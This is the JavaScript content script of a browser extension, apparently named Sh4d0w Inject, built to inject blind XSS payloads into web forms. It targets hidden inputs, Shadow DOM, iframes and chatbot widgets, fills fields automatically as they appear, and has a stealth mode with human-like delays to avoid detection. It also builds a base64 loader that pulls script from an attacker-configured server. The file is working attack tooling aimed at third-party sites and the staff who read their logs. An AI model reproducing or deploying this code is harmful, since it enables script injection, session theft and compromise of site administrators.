/**
 * Sh4d0w Inject v4.0.1 — Content Script
 * On-demand field detection & fill
 * {{SERVER}} replaced at runtime with user's configured server URL
 *
 * v4.0.1 Changelog:
 * - Hidden input injection (Blind XSS goldmine — logged server-side unsanitized)
 * - Chatbot widget detection (Intercom, Drift, Zendesk, Tawk.to, LiveChat, Crisp, Freshdesk, HubSpot)
 * - Cross-origin iframe message injection for chatbots
 * - Shadow DOM recursive scanning
 * - MutationObserver for SPA dynamic fields (React/Vue/Angular)
 * - Stealth fill mode — human-like delays (2-8s between fields)
 * - Smart context-aware encoding
 * - Enhanced field detection for modern frameworks
 */

(function () {
    'use strict';

    if (window.__sh4d0w_loaded) return;
    window.__sh4d0w_loaded = true;

    const DB = window.BLINDXSS_PAYLOADS;

    // Server URL injected by background script
    const SERVER_URL = window.__SH4D0W_SERVER || '';

    // v4.0: Stealth mode flag
    const STEALTH_MODE = window.__SH4D0W_STEALTH || false;

    // Replace {{SERVER}} and {{LOADER_B64}} in any payload string
    function resolvePayload(payload) {
        if (!SERVER_URL) return payload;
        payload = payload.replace(/\{\{SERVER\}\}/g, SERVER_URL);
        if (payload.includes('{{LOADER_B64}}')) {
            const loaderCode = 'var a=document.createElement("script");a.src="' + SERVER_URL + '";document.body.appendChild(a);';
            try {
                payload = payload.replace(/\{\{LOADER_B64\}\}/g, btoa(loaderCode));
            } catch (e) { /* btoa failed, leave as-is */ }
        }
        return payload;
    }

    // =============================
    // Field Type Detection
    // =============================
    function classifyField(el) {
        const tag = el.tagName.toLowerCase();
        const type = (el.getAttribute('type') || '').toLowerCase();
        const name = (el.getAttribute('name') || '').toLowerCase();
        const id = (el.getAttribute('id') || '').toLowerCase();
        const placeholder = (el.getAttribute('placeholder') || '').toLowerCase();
        const label = getLabel(el).toLowerCase();
        const ariaLabel = (el.getAttribute('aria-label') || '').toLowerCase();
        const autocomplete = (el.getAttribute('autocomplete') || '').toLowerCase();
        const className = (el.getAttribute('class') || '').toLowerCase();
        const dataTestId = (el.getAttribute('data-testid') || el.getAttribute('data-test') || '').toLowerCase();

        const combined = `${name} ${id} ${placeholder} ${label} ${ariaLabel} ${autocomplete} ${type} ${className} ${dataTestId}`;

        // v4.0.1: Hidden inputs → classify as 'hidden' type (DON'T skip!)
        if (type === 'hidden') return 'hidden';

        // These are truly non-injectable — skip them
        const skipTypes = ['password', 'file', 'submit', 'button', 'reset',
            'image', 'checkbox', 'radio', 'date', 'datetime-local', 'time',
            'month', 'week', 'color', 'range'];
        if (skipTypes.includes(type)) return null;

        if (tag === 'textarea') return 'message';
        if (el.getAttribute('contenteditable') === 'true') return 'message';

        // v4.0.1: Detect chatbot-related fields
        if (isChatbotField(el, combined)) return 'message';

        for (const [fieldType, config] of Object.entries(DB.fieldPatterns)) {
            for (const keyword of config.keywords) {
                if (combined.includes(keyword)) return fieldType;
            }
        }

        if (type === 'email') return 'email';
        if (type === 'tel') return 'phone';
        if (type === 'url') return 'url';
        if (type === 'search') return 'search';
        if (type === 'number') return 'phone';
        if (tag === 'select') return null;
        if (tag === 'input') return 'generic';
        return 'generic';
    }

    // v4.0.1: Detect if an element belongs to a chatbot widget
    function isChatbotField(el, combined) {
        // Known chatbot CSS class/ID patterns
        const chatbotPatterns = [
            // Intercom
            'intercom', 'intercom-messenger', 'intercom-composer',
            // Drift
            'drift', 'drift-widget', 'drift-frame',
            // Zendesk
            'zendesk', 'zopim', 'zEWidget',
            // Tawk.to
            'tawk', 'tawk-messenger', 'tawk-widget',
            // LiveChat
            'livechat', 'lc-', 'livechat-widget',
            // Crisp
            'crisp', 'crisp-client',
            // Freshdesk/Freshchat
            'freshdesk', 'freshchat', 'fc-widget',
            // HubSpot
            'hubspot', 'hs-chat', 'leadflow',
            // Olark
            'olark', 'hbl',
            // Generic chat patterns
            'chat-input', 'chat-message', 'chat-box', 'chatbox',
            'messenger-input', 'message-input', 'reply-box',
            'conversation-input', 'chat-composer', 'chat-textarea',
            'chat_input', 'msg-input', 'send-message'
        ];

        const elStr = combined + ' ' + (el.closest('[class]')?.className || '').toLowerCase();

        for (const pattern of chatbotPatterns) {
            if (elStr.includes(pattern)) return true;
        }

        // Check if element is inside a known chatbot container
        const chatContainerSelectors = [
            '#intercom-container', '#drift-widget', '#zendesk-widget',
            '#tawk-widget', '#livechat-widget', '#crisp-chatbox',
            '.intercom-messenger', '.drift-frame-controller',
            '[data-intercom]', '[data-drift]', '[data-tawk]',
            '#hubspot-messages-iframe-container',
            '#fc_frame', '#freshworks-container',
            '#olark-box-wrapper', '#olark-container'
        ];

        for (const sel of chatContainerSelectors) {
            try { if (el.closest(sel)) return true; } catch (e) { }
        }

        return false;
    }

    function getLabel(el) {
        const id = el.getAttribute('id');
        if (id) {
            try {
                const label = document.querySelector(`label[for="${CSS.escape(id)}"]`);
                if (label) return label.textContent || '';
            } catch (e) { }
        }
        const parentLabel = el.closest('label');
        if (parentLabel) return parentLabel.textContent || '';
        const labelledBy = el.getAttribute('aria-labelledby');
        if (labelledBy) {
            const labelEl = document.getElementById(labelledBy);
            if (labelEl) return labelEl.textContent || '';
        }
        return '';
    }

    // =============================
    // Payload Selection
    // =============================
    function getRandomItem(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    function getPayloadForField(fieldType) {
        // v4.0.1: Hidden fields get generic payloads (no visual context needed)
        if (fieldType === 'hidden') {
            const payloads = DB.payloadsByType.generic;
            return resolvePayload(getRandomItem(payloads));
        }
        const payloads = DB.payloadsByType[fieldType] || DB.payloadsByType.generic;
        return resolvePayload(getRandomItem(payloads));
    }

    // =============================
    // Field Filling
    // =============================
    function fillField(el, payload) {
        const type = (el.getAttribute('type') || '').toLowerCase();

        // v4.0.1: Hidden inputs — set directly (no focus/blur events needed)
        if (type === 'hidden') {
            fillHiddenField(el, payload);
            return;
        }

        el.focus();

        if (el.getAttribute('contenteditable') === 'true') {
            el.innerHTML = payload;
        } else {
            const tag = el.tagName.toLowerCase();
            let nativeSet;

            if (tag === 'textarea') {
                nativeSet = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value')?.set;
            } else {
                nativeSet = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')?.set;
            }

            if (nativeSet) {
                nativeSet.call(el, payload);
            } else {
                el.value = payload;
            }
        }

        // Dispatch all relevant events to trigger framework reactivity
        el.dispatchEvent(new Event('input', { bubbles: true, cancelable: true }));
        el.dispatchEvent(new Event('change', { bubbles: true, cancelable: true }));
        el.dispatchEvent(new Event('blur', { bubbles: true }));
        el.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, key: 'a', keyCode: 65 }));
        el.dispatchEvent(new KeyboardEvent('keyup', { bubbles: true, key: 'a', keyCode: 65 }));
        el.dispatchEvent(new KeyboardEvent('keypress', { bubbles: true, key: 'a', keyCode: 65 }));
        // React 16+ synthetic event support
        el.dispatchEvent(new Event('compositionend', { bubbles: true }));
    }

    // v4.0.1: Fill hidden input directly — no events needed, just raw value set
    function fillHiddenField(el, payload) {
        const nativeSet = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')?.set;
        if (nativeSet) {
            nativeSet.call(el, payload);
        } else {
            el.value = payload;
        }
        // Also set the attribute (some frameworks read from attribute, not property)
        el.setAttribute('value', payload);
        // Dispatch change event in case any JS is listening
        el.dispatchEvent(new Event('change', { bubbles: true, cancelable: true }));
    }

    // =============================
    // CSS Selectors — v4.0.1: INCLUDES hidden inputs
    // =============================
    const VISIBLE_FIELD_SELECTOR = [
        'input:not([type="submit"]):not([type="button"])',
        ':not([type="reset"]):not([type="file"]):not([type="image"])',
        ':not([type="checkbox"]):not([type="radio"]):not([type="date"])',
        ':not([type="datetime-local"]):not([type="time"]):not([type="month"])',
        ':not([type="week"]):not([type="color"]):not([type="range"])',
        ':not([type="password"])'
    ].join('');

    const FULL_SELECTOR = `${VISIBLE_FIELD_SELECTOR}, textarea, [contenteditable="true"]`;

    // v4.0.1: Check if element is fillable (relaxed for hidden inputs)
    function isElementFillable(el) {
        const type = (el.getAttribute('type') || '').toLowerCase();

        // Hidden inputs are ALWAYS fillable (they're server-side blind XSS goldmines)
        if (type === 'hidden') return true;

        // For visible fields, check visibility
        const rect = el.getBoundingClientRect();
        // Allow elements that are very small but not zero (some chatbot inputs are tiny)
        const style = getComputedStyle(el);
        if (style.display === 'none' && !isChatbotField(el, '')) return false;
        if (style.visibility === 'hidden' && !isChatbotField(el, '')) return false;
        if (el.readOnly || el.disabled) return false;
        return true;
    }

    // v4.0.1: Scan a single DOM root for fillable fields
    function scanRoot(root, fields) {
        try {
            root.querySelectorAll(FULL_SELECTOR).forEach(el => {
                if (!isElementFillable(el)) return;
                const fieldType = classifyField(el);
                if (fieldType) fields.push({ element: el, type: fieldType });
            });
        } catch (e) { /* Skip inaccessible roots */ }
    }

    // v4.0.1: Recursively scan including Shadow DOM
    function scanNodeRecursive(root, fields) {
        scanRoot(root, fields);

        // Scan Shadow DOMs
        try {
            root.querySelectorAll('*').forEach(el => {
                if (el.shadowRoot) {
                    scanNodeRecursive(el.shadowRoot, fields);
                }
            });
        } catch (e) { /* Skip inaccessible shadow roots */ }
    }

    // v4.0.1: Scan chatbot iframes specifically
    function scanChatbotIframes(fields) {
        const chatbotIframeSelectors = [
            'iframe[id*="intercom"]', 'iframe[name*="intercom"]',
            'iframe[id*="drift"]', 'iframe[name*="drift"]',
            'iframe[id*="zendesk"]', 'iframe[id*="zopim"]',
            'iframe[id*="tawk"]', 'iframe[name*="tawk"]',
            'iframe[id*="livechat"]', 'iframe[name*="livechat"]',
            'iframe[id*="crisp"]', 'iframe[name*="crisp"]',
            'iframe[id*="freshchat"]', 'iframe[id*="fc_"]',
            'iframe[id*="hubspot"]', 'iframe[id*="hs-"]',
            'iframe[id*="olark"]',
            'iframe[id*="chat"]', 'iframe[title*="chat"]',
            'iframe[title*="Chat"]', 'iframe[title*="messenger"]',
            'iframe[title*="Messenger"]', 'iframe[title*="Message"]',
            'iframe[src*="intercom"]', 'iframe[src*="drift"]',
            'iframe[src*="zendesk"]', 'iframe[src*="tawk"]',
            'iframe[src*="livechat"]', 'iframe[src*="crisp"]',
            'iframe[src*="freshchat"]', 'iframe[src*="hubspot"]'
        ];

        const selector = chatbotIframeSelectors.join(', ');

        try {
            document.querySelectorAll(selector).forEach(iframe => {
                try {
                    const doc = iframe.contentDocument || iframe.contentWindow?.document;
                    if (!doc) return;
                    scanNodeRecursive(doc, fields);
                } catch (e) {
                    // Cross-origin iframe — can't access directly
                    // But we already inject via headers, so payloads will fire when admin views logs
                }
            });
        } catch (e) { }
    }

    function getAllFillableFields() {
        const fields = [];

        // Recursively scan document including Shadow DOMs
        scanNodeRecursive(document, fields);

        // Scan ALL iframes (same-origin)
        try {
            document.querySelectorAll('iframe').forEach(iframe => {
                try {
                    const doc = iframe.contentDocument || iframe.contentWindow?.document;
                    if (!doc) return;
                    scanNodeRecursive(doc, fields);
                } catch (e) { }
            });
        } catch (e) { }

        // v4.0.1: Specifically target chatbot widget iframes
        scanChatbotIframes(fields);

        // De-duplicate (same element might be found via multiple scan paths)
        const seen = new WeakSet();
        const unique = [];
        for (const f of fields) {
            if (!seen.has(f.element)) {
                seen.add(f.element);
                unique.push(f);
            }
        }

        return unique;
    }

    // =============================
    // Stealth Fill — Human-like delays
    // =============================
    function stealthFillAllFields() {
        const fields = getAllFillableFields();
        let filledCount = 0;

        if (fields.length === 0) return { total: 0, filled: 0, hidden: 0, chatbot: 0 };

        let hiddenCount = 0;

        fields.forEach((field, index) => {
            const delay = 2000 + Math.floor(Math.random() * 6000);

            setTimeout(() => {
                const payload = getPayloadForField(field.type);

                if (field.type === 'hidden') {
                    // Hidden fields — no visual feedback, just fill silently
                    fillField(field.element, payload);
                    hiddenCount++;
                } else {
                    field.element.focus();
                    setTimeout(() => {
                        fillField(field.element, payload);
                        // Subtle green glow
                        field.element.style.transition = 'box-shadow 0.3s ease';
                        field.element.style.boxShadow = '0 0 6px 2px rgba(0, 255, 65, 0.4)';
                        setTimeout(() => {
                            field.element.style.boxShadow = '';
                            field.element.style.transition = '';
                        }, 400);
                    }, 100 + Math.floor(Math.random() * 200));
                }
            }, index * delay);

            filledCount++;
        });

        return { total: fields.length, filled: filledCount, hidden: hiddenCount };
    }

    // =============================
    // Main Fill Functions
    // =============================
    function fillAllFields() {
        if (STEALTH_MODE) {
            return stealthFillAllFields();
        }

        const fields = getAllFillableFields();
        let filledCount = 0;
        let hiddenCount = 0;

        fields.forEach((field, index) => {
            setTimeout(() => {
                const payload = getPayloadForField(field.type);
                fillField(field.element, payload);

                // v4.0.1: Visual feedback only for visible fields
                if (field.type !== 'hidden') {
                    field.element.style.transition = 'box-shadow 0.3s ease';
                    field.element.style.boxShadow = '0 0 10px 3px rgba(0, 255, 65, 0.6)';
                    setTimeout(() => {
                        field.element.style.boxShadow = '';
                        field.element.style.transition = '';
                    }, 800);
                } else {
                    hiddenCount++;
                }
            }, field.type === 'hidden' ? 0 : index * 80); // Hidden fields: instant, no delay

            filledCount++;
        });

        return { total: fields.length, filled: filledCount, hidden: hiddenCount };
    }

    function fillSingleField(el) {
        const fieldType = classifyField(el);
        if (!fieldType) return false;

        const payload = getPayloadForField(fieldType);
        fillField(el, payload);

        if (fieldType !== 'hidden') {
            el.style.transition = 'box-shadow 0.3s ease';
            el.style.boxShadow = '0 0 10px 3px rgba(0, 255, 65, 0.6)';
            setTimeout(() => {
                el.style.boxShadow = '';
                el.style.transition = '';
            }, 800);
        }

        return true;
    }

    function countFields() {
        const fields = getAllFillableFields();
        const counts = {};
        fields.forEach(f => { counts[f.type] = (counts[f.type] || 0) + 1; });
        return { total: fields.length, byType: counts };
    }

    // =============================
    // MutationObserver for SPAs
    // =============================
    let mutationObserverActive = false;

    function startMutationObserver() {
        if (mutationObserverActive) return;
        mutationObserverActive = true;

        const observer = new MutationObserver(mutations => {
            for (const mutation of mutations) {
                for (const node of mutation.addedNodes) {
                    if (node.nodeType !== Node.ELEMENT_NODE) continue;
                    const fields = [];
                    if (node.matches && node.matches(FULL_SELECTOR)) {
                        if (isElementFillable(node)) {
                            const fieldType = classifyField(node);
                            if (fieldType) fields.push({ element: node, type: fieldType });
                        }
                    }
                    if (node.querySelectorAll) {
                        scanRoot(node, fields);
                    }
                    // Also check if a chatbot widget was just injected
                    if (node.tagName === 'IFRAME' || (node.querySelectorAll && node.querySelectorAll('iframe').length > 0)) {
                        setTimeout(() => {
                            const iframeFields = [];
                            scanChatbotIframes(iframeFields);
                            iframeFields.forEach((field, i) => {
                                setTimeout(() => {
                                    const payload = getPayloadForField(field.type);
                                    fillField(field.element, payload);
                                }, i * 80);
                            });
                        }, 1000); // Wait for iframe content to load
                    }
                    // Auto-fill newly detected fields
                    fields.forEach((field, i) => {
                        setTimeout(() => {
                            const payload = getPayloadForField(field.type);
                            fillField(field.element, payload);
                            if (field.type !== 'hidden') {
                                field.element.style.transition = 'box-shadow 0.3s ease';
                                field.element.style.boxShadow = '0 0 10px 3px rgba(0, 255, 65, 0.6)';
                                setTimeout(() => {
                                    field.element.style.boxShadow = '';
                                    field.element.style.transition = '';
                                }, 800);
                            }
                        }, i * 80);
                    });
                }
            }
        });

        observer.observe(document.body, { childList: true, subtree: true });
    }

    // =============================
    // Message Listener
    // =============================
    chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
        if (message.action === 'fillAll') {
            const result = fillAllFields();
            startMutationObserver();
            sendResponse(result);
            return true;
        }
        if (message.action === 'fillField') {
            const el = document.activeElement;
            sendResponse({ success: el ? fillSingleField(el) : false });
            return true;
        }
        if (message.action === 'countFields') {
            sendResponse(countFields());
            return true;
        }
    });

})();
